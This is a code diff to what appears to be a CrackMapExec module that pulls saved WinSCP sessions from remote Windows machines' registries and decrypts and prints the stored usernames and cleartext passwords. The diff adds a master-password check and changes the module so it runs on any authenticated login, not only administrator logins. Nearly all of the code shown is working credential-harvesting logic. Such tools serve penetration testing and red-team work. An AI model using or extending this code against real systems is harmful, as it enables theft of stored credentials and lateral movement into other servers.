@@ -43,7 +43,6 @@ class CMEModule:
             context.log.highlight("UserName: {s}".format(s=session[2]))
             context.log.highlight("Password: {s}".format(s=session[3]))
 
-
     # ==================== Decrypt Password ====================
     def decryptPasswd(self, context, host: str, username: str, password: str) -> str:
         key = username + host
@@ -75,7 +74,6 @@ class CMEModule:
             clearpass = clearpass[len(key):]
         return clearpass
 
-
     def dec_next_char(self, passBytes) -> tuple[int, bytes]:
         """
         Decrypts the first byte of the password and returns the decrypted byte and the remaining bytes.
@@ -90,7 +88,6 @@ class CMEModule:
         b = passBytes[1]
         passBytes = passBytes[2:]
         return ~(((a << 4) + b) ^ self.PW_MAGIC) & 0xff, passBytes
-
 
     # ==================== Handle Registry ====================
     def registrySessionExtractor(self, context, connection, userObject, sessionName):
@@ -254,6 +251,23 @@ class CMEModule:
         finally:
             remoteOps.finish()
 
+    def checkMasterpasswordSet(self, context, connection, userObject):
+        try:
+            remoteOps = RemoteOperations(connection.conn, False)
+            remoteOps.enableRegistry()
+
+            ans = rrp.hOpenUsers(remoteOps._RemoteOperations__rrp)
+            regHandle = ans['phKey']
+
+            ans = rrp.hBaseRegOpenKey(remoteOps._RemoteOperations__rrp, regHandle, userObject + '\\Software\\Martin Prikryl\\WinSCP 2\\Configuration\\Security')
+            keyHandle = ans['phkResult']
+
+            useMasterPassword = rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, keyHandle, 'UseMasterPassword')[1]
+            rrp.hBaseRegCloseKey(remoteOps._RemoteOperations__rrp, keyHandle)
+        finally:
+            remoteOps.finish()
+        return useMasterPassword
+
     def registryDiscover(self, context, connection):
         try:
             remoteOps = RemoteOperations(connection.conn, False)
@@ -270,7 +284,6 @@ class CMEModule:
             # Retrieve how many sessions are stored in registry from each UserObject
             ans = rrp.hOpenUsers(remoteOps._RemoteOperations__rrp)
             regHandle = ans['phKey']
-
             for userObject in allUserObjects:
                 try:
                     ans = rrp.hBaseRegOpenKey(remoteOps._RemoteOperations__rrp, regHandle, userObject + '\\Software\\Martin Prikryl\\WinSCP 2\\Sessions')
@@ -280,6 +293,7 @@ class CMEModule:
                     sessions = data['lpcSubKeys']
                     context.log.success("Found {} sessions for userObject {} in registry!".format(sessions - 1, userObject))
                     
+                    
                     # Get Session Names
                     sessionNames = []
                     for i in range(sessions):
@@ -287,6 +301,9 @@ class CMEModule:
                     rrp.hBaseRegCloseKey(remoteOps._RemoteOperations__rrp, keyHandle)
                     sessionNames.remove('Default%20Settings')
 
+                    if self.checkMasterpasswordSet(context, connection, userObject):
+                        context.log.error("MasterPassword set! Aborting extraction...")
+                        continue
                     # Extract stored Session infos
                     for sessionName in sessionNames:
                         self.printCreds(context, self.registrySessionExtractor(context, connection, userObject, sessionName))
@@ -302,9 +319,9 @@ class CMEModule:
 
     # ==================== Handle Configs ====================
 
-    def on_login(self, context, connection):
-        pass
+    #def on_login(self, context, connection):
+    #    pass
 
-    def on_admin_login(self, context, connection):
+    def on_login(self, context, connection):
         self.registryDiscover(context, connection)
 
